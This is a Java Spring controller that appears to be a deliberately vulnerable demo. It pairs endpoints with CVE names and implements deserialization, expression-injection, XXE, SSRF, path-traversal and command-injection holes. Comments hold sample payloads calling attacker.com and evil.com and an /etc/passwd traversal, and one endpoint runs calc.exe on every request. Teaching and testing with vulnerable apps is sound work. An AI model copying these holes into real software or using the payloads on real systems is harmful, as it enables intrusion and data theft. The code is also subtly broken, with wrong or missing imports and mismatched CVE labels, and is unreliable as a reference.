package com.example.demo.routes;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.InputSource;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;
import org.mvel2.MVEL;
import org.ognl.Ognl;
import org.ognl.OgnlContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.management.jmx.MBeanServerConnection;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;

@RestController
@RequestMapping("/api/cve")
public class CVECodeReview {

    private static final Logger logger = LoggerFactory.getLogger(CVECodeReview.class);
    private static final AtomicReference<Thread> logServerThread = new AtomicReference<>();

    /**
     * CVE-2022-22965 - Spring4Shell
     * Remote Code Execution via Data Binding
     * 
     * Vulnerability: Allows attackers to modify Class.module.classLoader via
     * nested property binding
     */
    @PostMapping("/spring4shell")
    public ResponseEntity<String> spring4Shell(@RequestParam Map<String, Object> params) {
        try {
            // Vulnerable: Allows arbitrary property access
            VulnerableDataClass target = new VulnerableDataClass();
            for (Map.Entry<String, Object> entry : params.entrySet()) {
                // This can be exploited by sending:
                // class.module.classLoader.URLs[0]=malicious_url
                setProperty(target, entry.getKey(), entry.getValue());
            }
            return ResponseEntity.ok("Properties set successfully");
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2021-44228 - Log4Shell
     * Remote Code Execution via JNDI Injection
     * 
     * Vulnerability: Allows attackers to execute arbitrary code via JNDI LDAP/RMI
     */
    @GetMapping("/log4shell")
    public ResponseEntity<String> log4shell(@RequestParam String username) {
        try {
            // Vulnerable: Directly logging user input that could contain JNDI lookup
            // Example exploit: ${jndi:ldap://attacker.com/exploit}
            logger.info("User login attempt: " + username);
            return ResponseEntity.ok("Logged username: " + username);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2020-36518 - Jackson Polymorphic Deserialization
     * Remote Code Execution via Type Confusion
     * 
     * Vulnerability: Unsafe deserialization of JSON with polymorphic types
     */
    @PostMapping("/jackson")
    public ResponseEntity<String> jacksonVuln(@RequestBody String json) {
        try {
            // Vulnerable: Allows polymorphic type handling
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(); // Deprecated due to security issues
            Object obj = mapper.readValue(json, Object.class);
            return ResponseEntity.ok("Deserialized object: " + obj.getClass().getName());
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2020-13942 - Apache Unomi RCE
     * Remote Code Execution via MVEL Injection
     * 
     * Vulnerability: Unsafe MVEL expression evaluation
     */
    @PostMapping("/mvel")
    public ResponseEntity<String> mvelInjection(@RequestBody Map<String, Object> condition) {
        try {
            // Vulnerable: Direct evaluation of user-provided MVEL expressions
            String mvelExpr = (String) condition.get("propertyName");
            // Attacker can inject: "T(java.lang.Runtime).getRuntime().exec('calc.exe')"
            Object result = MVEL.eval(mvelExpr, new HashMap<>());
            return ResponseEntity.ok("Evaluated expression result: " + result);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2019-12384 - H2 Database Console
     * Remote Code Execution via JNDI Injection
     * 
     * Vulnerability: Unsafe database URL handling
     */
    @GetMapping("/h2-console")
    public ResponseEntity<String> h2ConsoleVuln(@RequestParam String url) {
        try {
            // Vulnerable: Direct use of user-provided database URL
            // Attacker can inject: jdbc:h2:mem:;INIT=RUNSCRIPT FROM
            // 'http://evil.com/exec.sql'
            Connection conn = DriverManager.getConnection(url);
            return ResponseEntity.ok("Connected to database: " + url);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2018-1258 - Spring Security OAuth
     * Authentication Bypass
     * 
     * Vulnerability: Improper validation of OAuth2 tokens
     */
    @GetMapping("/oauth")
    public ResponseEntity<String> oauthBypass(@RequestHeader("Authorization") String token) {
        try {
            // Vulnerable: Insufficient validation of OAuth tokens
            if (token != null && token.startsWith("Bearer ")) {
                // Missing proper signature validation
                String[] parts = token.split("\\.");
                // Direct trust of token claims without verification
                return ResponseEntity.ok("Token accepted: " + parts[1]);
            }
            return ResponseEntity.badRequest().body("Invalid token format");
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2017-5645 - Apache Log4j TCP Socket Server
     * Deserialization of Untrusted Data
     * 
     * Vulnerability: Unsafe deserialization in logging server
     */
    @PostMapping("/log4j-socket")
    public ResponseEntity<String> startLogServer() {
        if (logServerThread.get() != null && logServerThread.get().isAlive()) {
            return ResponseEntity.badRequest().body("Log server is already running");
        }

        Thread serverThread = new Thread(() -> processLogEvents());
        serverThread.setDaemon(true);
        serverThread.start();
        logServerThread.set(serverThread);

        return ResponseEntity.ok("Log server started on port 4560");
    }

    /**
     * Test endpoint to send log events to the vulnerable server
     */
    @PostMapping("/log4j-socket/test")
    public ResponseEntity<String> testLogServer(@RequestParam String message, @RequestParam String level) {
        try (Socket socket = new Socket("localhost", 4560)) {
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            LogEvent event = new LogEvent(message, level);
            oos.writeObject(event);
            oos.flush();
            return ResponseEntity.ok("Log event sent successfully");
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error sending log event: " + e.getMessage());
        }
    }

    /**
     * CVE-2016-4437 - Apache Shiro Authentication Bypass
     * Padding Oracle Attack
     * 
     * Vulnerability: Unsafe remember-me cookie encryption
     */
    @GetMapping("/shiro")
    public ResponseEntity<String> shiroVuln(@CookieValue("rememberMe") String cookie) {
        try {
            // Vulnerable: Using ECB mode for remember-me cookie encryption
            byte[] key = "insecure_key_123".getBytes(); // Hardcoded key for demo
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding"); // ECB is vulnerable
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"));
            byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(cookie));
            return ResponseEntity.ok("Cookie decrypted: " + new String(decrypted));
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2015-7501 - Apache Commons Collections
     * Remote Code Execution via Serialization
     * 
     * Vulnerability: Unsafe deserialization of transformed collections
     */
    @PostMapping("/commons-collections")
    public ResponseEntity<String> commonsCollections(@RequestBody byte[] serialized) {
        try {
            // Create a vulnerable TransformedMap that will execute 'calc.exe' when a value
            // is added
            Map<String, String> map = new HashMap<>();
            @SuppressWarnings({ "unchecked", "rawtypes" })
            Map<String, String> transformedMap = TransformedMap.transformingMap(map,
                    null,
                    new InvokerTransformer("exec",
                            new Class[] { String.class },
                            new Object[] { "calc.exe" }));

            // Add the transformedMap to trigger the vulnerability
            transformedMap.put("key", "value"); // This will execute calc.exe

            // Also demonstrate the deserialization vulnerability
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serialized));
            Object obj = ois.readObject(); // This could also contain malicious gadgets

            return ResponseEntity.ok("Executed transformer and deserialized object: " + obj.getClass().getName());
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2021-21351 - XML External Entity (XXE) Injection
     * Remote Code Execution via XML Parser
     * 
     * Vulnerability: Unsafe XML parsing allowing external entity resolution
     */
    @PostMapping("/xxe")
    public ResponseEntity<String> xxeVulnerability(@RequestBody String xml) {
        try {
            // Vulnerable: Using XML parser without disabling external entities
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document doc = builder.parse(new InputSource(new StringReader(xml)));
            return ResponseEntity.ok("XML parsed: " + doc.getDocumentElement().getNodeName());
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2020-25638 - Path Traversal
     * File Access Outside Intended Directory
     * 
     * Vulnerability: Unsafe file path handling
     */
    @GetMapping("/download")
    public ResponseEntity<String> pathTraversal(@RequestParam String filename) {
        try {
            // Vulnerable: Not sanitizing file path
            File file = new File("./uploads/" + filename);
            // Attacker can use ../../../etc/passwd
            String content = new String(java.nio.file.Files.readAllBytes(file.toPath()));
            return ResponseEntity.ok(content);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2020-13956 - SSRF (Server-Side Request Forgery)
     * Arbitrary URL Access
     * 
     * Vulnerability: Unsafe URL handling in HTTP client
     */
    @GetMapping("/proxy")
    public ResponseEntity<String> ssrfVulnerability(@RequestParam String url) {
        try {
            // Vulnerable: No URL validation
            URL target = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) target.openConnection();
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            return ResponseEntity.ok(response.toString());
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2019-0232 - Command Injection via Environment Variables
     * Remote Code Execution
     * 
     * Vulnerability: Unsafe handling of environment variables in commands
     */
    @GetMapping("/env")
    public ResponseEntity<String> environmentInjection(@RequestParam String env) {
        try {
            // Vulnerable: Unsanitized environment variable usage
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "echo %" + env + "%");
            Process p = pb.start();
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String output = reader.readLine();
            return ResponseEntity.ok("Environment value: " + output);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2018-11776 - OGNL Expression Injection
     * Remote Code Execution
     * 
     * Vulnerability: Unsafe OGNL expression evaluation
     */
    @PostMapping("/ognl")
    public ResponseEntity<String> ognlInjection(@RequestBody String expression) {
        try {
            // Vulnerable: Direct OGNL expression evaluation
            OgnlContext context = new OgnlContext();
            Object value = Ognl.getValue(expression, context, context.getRoot());
            return ResponseEntity.ok("Evaluated result: " + value);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2017-12149 - JBoss Deserialization
     * Remote Code Execution via JMX
     * 
     * Vulnerability: Unsafe JMX invocation handling
     */
    @PostMapping("/jmx")
    public ResponseEntity<String> jmxVulnerability(@RequestParam String objectName, @RequestParam String method) {
        try {
            // Vulnerable: Unsafe JMX method invocation
            MBeanServer server = ManagementFactory.getPlatformMBeanServer();
            ObjectName mbeanName = new ObjectName(objectName);
            Object result = server.invoke(mbeanName, method, null, null);
            return ResponseEntity.ok("JMX invocation result: " + result);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    /**
     * CVE-2016-6809 - Unsafe Reflection
     * Remote Code Execution via Reflection
     * 
     * Vulnerability: Unsafe class loading and method invocation
     */
    @GetMapping("/reflect")
    public ResponseEntity<String> reflectionVulnerability(@RequestParam String className, @RequestParam String method) {
        try {
            // Vulnerable: Unsafe reflection
            Class<?> clazz = Class.forName(className);
            Method m = clazz.getMethod(method);
            Object result = m.invoke(clazz.newInstance());
            return ResponseEntity.ok("Reflection result: " + result);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body("Error: " + e.getMessage());
        }
    }

    private void processLogEvents() {
        // Vulnerable: Processing serialized log events without validation
        try (ServerSocket serverSocket = new ServerSocket(4560)) {
            logger.info("Log server listening on port 4560");
            while (true) {
                try (Socket socket = serverSocket.accept()) {
                    ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                    LogEvent event = (LogEvent) ois.readObject(); // Unsafe
                    logger.info("Received log event: " + event.getMessage() + " [" + event.getLevel() + "]");
                } catch (Exception e) {
                    logger.error("Error processing log event", e);
                }
            }
        } catch (Exception e) {
            logger.error("Log server error", e);
        }
    }

    // Helper class for Spring4Shell example
    private static class VulnerableDataClass {
        private String data;

        public void setData(String data) {
            this.data = data;
        }

        public String getData() {
            return data;
        }
    }

    // Helper class for Log4j example
    private static class LogEvent implements java.io.Serializable {
        private static final long serialVersionUID = 1L;
        private String message;
        private String level;
        private Date timestamp;

        public LogEvent(String message, String level) {
            this.message = message;
            this.level = level;
            this.timestamp = new Date();
        }

        public String getMessage() {
            return message;
        }

        public String getLevel() {
            return level;
        }

        public Date getTimestamp() {
            return timestamp;
        }
    }

    // Helper method for property setting
    private void setProperty(Object obj, String property, Object value) {
        try {
            // Vulnerable implementation that allows setting any property
            String[] parts = property.split("\\.");
            Object current = obj;
            for (int i = 0; i < parts.length - 1; i++) {
                current = current.getClass().getMethod("get" + capitalize(parts[i])).invoke(current);
            }
            current.getClass().getMethod("set" + capitalize(parts[parts.length - 1]), value.getClass())
                    .invoke(current, value);
        } catch (Exception e) {
            throw new RuntimeException("Error setting property: " + property, e);
        }
    }

    private String capitalize(String str) {
        return str.substring(0, 1).toUpperCase() + str.substring(1);
    }
}
